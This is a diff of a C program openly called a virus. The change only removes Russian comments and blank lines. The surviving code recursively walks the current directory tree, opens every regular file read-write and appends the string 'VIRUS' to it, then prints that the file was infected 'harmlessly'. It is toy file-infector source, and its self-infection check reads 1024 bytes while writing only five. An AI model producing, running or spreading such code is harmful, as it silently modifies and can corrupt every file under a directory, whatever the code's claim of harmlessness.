@@ -6,22 +6,16 @@
 
 #define VIRUS_SIZE 1024
 
-// Функция для вывода сообщения о заражении
 void notify_infection(const char* filename) {
     printf("File %s has been infected (harmlessly)!\n", filename);
 }
-
 void infect_file(const char* filename) {
     FILE* file = fopen(filename, "r+b");
     if (file == NULL) {
         return;
     }
-
-    // Переместиться в конец файла
     fseek(file, 0, SEEK_END);
     long file_size = ftell(file);
-
-    // Проверить, заражен ли файл
     fseek(file, file_size - VIRUS_SIZE, SEEK_SET);
     char buffer[VIRUS_SIZE];
     fread(buffer, 1, VIRUS_SIZE, file);
@@ -29,22 +23,16 @@ void infect_file(const char* filename) {
         fclose(file);
         return;
     }
-
-    // Записать вирус в конец файла
     fseek(file, 0, SEEK_END);
     fprintf(file, "VIRUS");
     fclose(file);
-
-    // Уведомить о заражении
     notify_infection(filename);
 }
-
 void spread_virus(const char* directory) {
     DIR* dir = opendir(directory);
     if (dir == NULL) {
         return;
     }
-
     struct dirent* entry;
     while ((entry = readdir(dir)) != NULL) {
         if (entry->d_type == DT_REG) {
@@ -58,12 +46,10 @@ void spread_virus(const char* directory) {
             spread_virus(subdir);
         }
     }
-
     closedir(dir);
 }
 
 int main() {
-    // Распространение вируса в текущем каталоге и подкаталогах
     spread_virus(".");
     return 0;
 }
